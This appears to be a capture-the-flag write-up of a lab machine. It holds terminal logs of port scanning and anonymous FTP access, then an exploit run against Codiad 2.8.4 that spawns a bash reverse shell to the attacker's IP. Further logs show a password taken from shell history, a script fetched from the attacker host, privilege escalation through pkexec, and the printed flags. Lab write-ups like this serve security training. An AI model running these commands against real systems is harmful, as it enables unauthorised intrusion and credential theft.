---
An easy box to polish your enumeration skills!
---

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/3ce8e9c4d1da5eefef690e11f75798c7.png)

Gain a shell on the box and escalate your privileges!

```
└─$ rustscan -a 10.10.112.120 --ulimit 5000 -b 65535 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.112.120:21
Open 10.10.112.120:22
Open 10.10.112.120:80
Open 10.10.112.120:62337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 15:47 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
Initiating Ping Scan at 15:47
Scanning 10.10.112.120 [2 ports]
Completed Ping Scan at 15:47, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:47
Completed Parallel DNS resolution of 1 host. at 15:47, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:47
Scanning 10.10.112.120 [4 ports]
Discovered open port 22/tcp on 10.10.112.120
Discovered open port 80/tcp on 10.10.112.120
Discovered open port 21/tcp on 10.10.112.120
Discovered open port 62337/tcp on 10.10.112.120
Completed Connect Scan at 15:47, 0.21s elapsed (4 total ports)
Initiating Service scan at 15:47
Scanning 4 services on 10.10.112.120
Completed Service scan at 15:47, 13.17s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.112.120.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:47
NSE: [ftp-bounce 10.10.112.120:21] PORT response: 500 Illegal PORT command.
Completed NSE at 15:47, 9.64s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 2.64s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
Nmap scan report for 10.10.112.120
Host is up, received syn-ack (0.24s latency).
Scanned at 2022-09-19 15:47:15 EDT for 26s

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.1.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC94RvPaQ09Xx+jMj32opOMbghuvx4OeBVLc+/4Hascmrtsa+SMtQGSY7b+eyW8Zymxi94rGBIN2ydPxy3XXGtkaCdQluOEw5CqSdb/qyeH+L/1PwIhLrr+jzUoUzmQil+oUOpVMOkcW7a00BMSxMCij0HdhlVDNkWvPdGxKBviBDEKZAH0hJEfexz3Tm65cmBpMe7WCPiJGTvoU9weXUnO3+41Ig8qF7kNNfbHjTgS0+XTnDXk03nZwIIwdvP8dZ8lZHdooM8J9u0Zecu4OvPiC4XBzPYNs+6ntLziKlRMgQls0e3yMOaAuKfGYHJKwu4AcluJ/+g90Hr0UqmYLHEV
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBzKTu7YDGKubQ4ADeCztKu0LL5RtBXnjgjE07e3Go/GbZB2vAP2J9OEQH/PwlssyImSnS3myib+gPdQx54lqZU=
|   256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+oGPm8ZVYNUtX4r3Fpmcj9T9F2SjcRg4ansmeGR3cP
80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
62337/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Codiad 2.8.4
|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:47
Completed NSE at 15:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.48 seconds

                                                                                              
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ ftp 10.10.112.120
Connected to 10.10.112.120.
220 (vsFTPd 3.0.3)
Name (10.10.112.120:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||8503|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||39704|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> mget *
ftp> ls -la
229 Entering Extended Passive Mode (|||6318|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||55038|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
226 Directory send OK.
ftp> mget *
mget - [anpqy?]? 
229 Entering Extended Passive Mode (|||23621|)
150 Opening BINARY mode data connection for - (151 bytes).
100% |*************************************************|   151      382.02 KiB/s    00:00 ETA
226 Transfer complete.
151 bytes received in 00:00 (0.75 KiB/s)
ftp> exit
221 Goodbye.



┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ ls
-  backup  backup.pgp  gpg.hash  private.asc
                                                                                              
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ cat -     
^C
                                                                                              
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ echo *                                        
backup backup.pgp gpg.hash private.asc
                                                                                              
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ xxd                                                     
^C
                                                                                              
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ xxd -          
^C
                                                                                              
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ ls
-  backup  backup.pgp  gpg.hash  private.asc
                                                                                              
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ ls -la         
total 28
-rw-r--r-- 1 kali kali  151 Jun 18  2021 -
drwxr-xr-x 2 kali kali 4096 Sep 19 15:53 .
drwxr-xr-x 4 kali kali 4096 Sep 19 14:48 ..
-rw-r--r-- 1 kali kali  950 Sep 19 14:58 backup
-rw-r--r-- 1 kali kali  524 Aug 11  2019 backup.pgp
-rw-r--r-- 1 kali kali  255 Sep 19 14:52 gpg.hash
-rw-r--r-- 1 kali kali 3762 Aug 11  2019 private.asc
                                                                                              
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ mv "-" ver         
                                                                                              
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ ls    
backup  backup.pgp  gpg.hash  private.asc  ver
                                                                                              
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ cat ver
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.

john:password

┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ searchsploit codiad
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                     | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                         | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)        | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)    | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)    | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)    | multiple/webapps/50474.txt
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                              
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ locate /webapps/49705.py
/usr/share/exploitdb/exploits/multiple/webapps/49705.py
                                                                                              
┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ cat /usr/share/exploitdb/exploits/multiple/webapps/49705.py
# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated)
# Discovery by: WangYihang
# Vendor Homepage: http://codiad.com/
# Software Links : https://github.com/Codiad/Codiad/releases
# Tested Version: Version: 2.8.4
# CVE: CVE-2018-14009


┌──(kali㉿kali)-[~/confidential/anonforce]
└─$ python3 /usr/share/exploitdb/exploits/multiple/webapps/49705.py http://10.10.112.120:62337/ john password 10.18.1.77 1234 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.18.1.77/1235 0>&1 2>&1"' | nc -lnvp 1234
nc -lnvp 1235
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...

┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
└─$ echo 'bash -c "bash -i >/dev/tcp/10.18.1.77/1235 0>&1 2>&1"' | nc -lnvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.112.120.
Ncat: Connection from 10.10.112.120:53782.


┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1235
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1235
Ncat: Listening on 0.0.0.0:1235
Ncat: Connection from 10.10.112.120.
Ncat: Connection from 10.10.112.120:58916.
bash: cannot set terminal process group (961): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ide:/var/www/html/codiad/components/filemanager$ cd /home/drac
cd /home/drac
www-data@ide:/home/drac$ ls -la
ls -la
total 52
drwxr-xr-x 6 drac drac 4096 Aug  4  2021 .
drwxr-xr-x 3 root root 4096 Jun 17  2021 ..
-rw------- 1 drac drac   49 Jun 18  2021 .Xauthority
-rw-r--r-- 1 drac drac   36 Jul 11  2021 .bash_history
-rw-r--r-- 1 drac drac  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 drac drac 3787 Jul 11  2021 .bashrc
drwx------ 4 drac drac 4096 Jun 18  2021 .cache
drwxr-x--- 3 drac drac 4096 Jun 18  2021 .config
drwx------ 4 drac drac 4096 Jun 18  2021 .gnupg
drwx------ 3 drac drac 4096 Jun 18  2021 .local
-rw-r--r-- 1 drac drac  807 Apr  4  2018 .profile
-rw-r--r-- 1 drac drac    0 Jun 17  2021 .sudo_as_admin_successful
-rw------- 1 drac drac  557 Jun 18  2021 .xsession-errors
-r-------- 1 drac drac   33 Jun 18  2021 user.txt
www-data@ide:/home/drac$ cat .bash_history
cat .bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'

www-data@ide:/home/drac$ python3 -c "import pty;pty.spawn('/bin/bash')"   
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ide:/home/drac$ su drac
su drac
Password: Th3dRaCULa1sR3aL

drac@ide:~$ ls
ls
user.txt
drac@ide:~$ cat user.txt
cat user.txt
02930d21a8eb009f6d26361b2d24a466

priv esc


https://github.com/jesusgavancho/linux-smart-enumeration

https://github.com/ly4k/PwnKit

drac@ide:~$ id
id
uid=1000(drac) gid=1000(drac) groups=1000(drac),24(cdrom),27(sudo),30(dip),46(plugdev)
drac@ide:~$ sudo -l
sudo -l
[sudo] password for drac: Th3dRaCULa1sR3aL

Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
drac@ide:~$ wget http://10.18.1.77:8000/lse.sh
wget http://10.18.1.77:8000/lse.sh
--2022-09-19 20:57:01--  http://10.18.1.77:8000/lse.sh
Connecting to 10.18.1.77:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 48022 (47K) [text/x-sh]
Saving to: ‘lse.sh’

lse.sh              100%[===================>]  46.90K   114KB/s    in 0.4s    

2022-09-19 20:57:01 (114 KB/s) - ‘lse.sh’ saved [48022/48022]

drac@ide:~$ ls
ls
lse.sh  user.txt
drac@ide:~$ ./lse.sh     
./lse.sh
bash: ./lse.sh: Permission denied
drac@ide:~$ chmod +x lse.sh
chmod +x lse.sh
drac@ide:~$ ./lse.sh
./lse.sh
---
If you know the current user password, write it here to check sudo privileges: Th3dRaCULa1sR3aL            
Th3dRaCULa1sR3aL
---
                                                                                                           
 LSE Version: 4.9nw                                                                                        

        User: drac
     User ID: 1000
    Password: ******
        Home: /home/drac
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
       umask: 0002

    Hostname: ide
       Linux: 4.15.0-147-generic
Distribution: Ubuntu 18.04.5 LTS
Architecture: x86_64

=====================( Current Output Verbosity Level: 0 )======================
===============================================================( humanity )=====
[!] nowar0 Should we question autocrats and their "military operations"?... yes!
---
                                      NO   
                                      WAR  
---
==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... yes!
[*] usr020 Are there other users in administrative groups?................. yes!
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                           
[i] usr060 Other users..................................................... skip                           
[*] usr070 PATH variables defined inside /etc.............................. yes!                           
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[!] sud020 Can we sudo with a password?.................................... nope
[!] sud030 Can we list sudo commands with a password?...................... yes!
---
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
---
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ yes!
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ nope
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                           
[!] fst060 Can we write to any setgid binary?.............................. skip                           
[*] fst070 Can we read /root?.............................................. nope                           
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'drac' have mail?.......................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'drac'...................................... skip
[i] fst510 SSH files anywhere.............................................. skip                           
[i] fst520 Check hosts.equiv file and its contents......................... skip                           
[i] fst530 List NFS server shares.......................................... skip                           
[i] fst540 Dump fstab file................................................. skip                           
=================================================================( system )=====                           
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                           
[!] sys020 Does the /etc/passwd have hashes?............................... nope                           
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                           
[i] sys080 System password policies in /etc/login.defs..................... skip                           
===============================================================( security )=====                           
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                           
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
[!] ret060 Can we write to executable paths present in cron jobs........... nope
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope                           
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                           
[*] net000 Services listening only on localhost............................ nope
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                           
[i] net520 ARP table....................................................... skip                           
[i] net530 Nameservers..................................................... skip                           
[i] net540 Systemd Nameservers............................................. skip                           
[i] net550 Listening TCP................................................... skip                           
[i] net560 Listening UDP................................................... skip                           
===============================================================( services )=====                           
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                           
[i] srv420 List /etc/xinetd.d if used...................................... skip                           
[i] srv430 List /etc/init.d/ permissions................................... skip                           
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                           
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                           
[i] srv460 List /etc/init/ permissions..................................... skip                           
[!] srv500 Can we write in systemd service files?.......................... yes!                           
---
/lib/systemd/system/vsftpd.service
---
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                           
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. yes!
---
/run/user/1000/gnupg/S.gpg-agent.browser
/run/user/1000/gnupg/S.gpg-agent
/run/user/1000/gnupg/S.gpg-agent.ssh
/run/user/1000/gnupg/S.gpg-agent.extra
---
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[*] sof170 Can we access MongoDB databases without credentials?............ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                           
[i] sof520 Postgres version................................................ skip                           
[i] sof530 Apache version.................................................. skip                           
[i] sof540 Tmux version.................................................... skip                           
[i] sof550 Screen version.................................................. skip                           
=============================================================( containers )=====                           
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                           
===================================================================( CVEs )=====                           
  In order to test for CVEs, download lse.sh from the GitHub releases page.
  Alternatively, build lse_cve.sh using tools/package_cvs_into_lse.sh from the
 repository.
==================================( FINISHED )==================================

cannot use pwnkit

drac@ide:~$ echo $$
echo $$
2112


┌──(kali㉿kali)-[~]
└─$ ssh drac@10.10.112.120                        
The authenticity of host '10.10.112.120 (10.10.112.120)' can't be established.
ED25519 key fingerprint is SHA256:74/tt/begRRzOOEOmVr2W3VX96tjC2aHyfqOEFUOkRk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.112.120' (ED25519) to the list of known hosts.
drac@10.10.112.120's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep 19 21:17:15 UTC 2022

  System load:  0.0               Processes:           114
  Usage of /:   49.9% of 8.79GB   Users logged in:     0
  Memory usage: 67%               IP address for eth0: 10.10.112.120
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

69 packages can be updated.
1 update is a security update.


Last login: Wed Aug  4 06:36:42 2021 from 192.168.0.105
drac@ide:~$ pkttyagent -p 2112
==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
Authentication is needed to run `/bin/bash' as the super user                                              
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===


drac@ide:~$ pkexec /bin/bash
pkexec /bin/bash
root@ide:~# cat /root/root.txt
cat /root/root.txt
ce258cb16f47f1c66f0b0b77f4e0fb8d
root@ide:~# 




```


user.txt
*02930d21a8eb009f6d26361b2d24a466*



root.txt
*ce258cb16f47f1c66f0b0b77f4e0fb8d*

[[Anonforce]]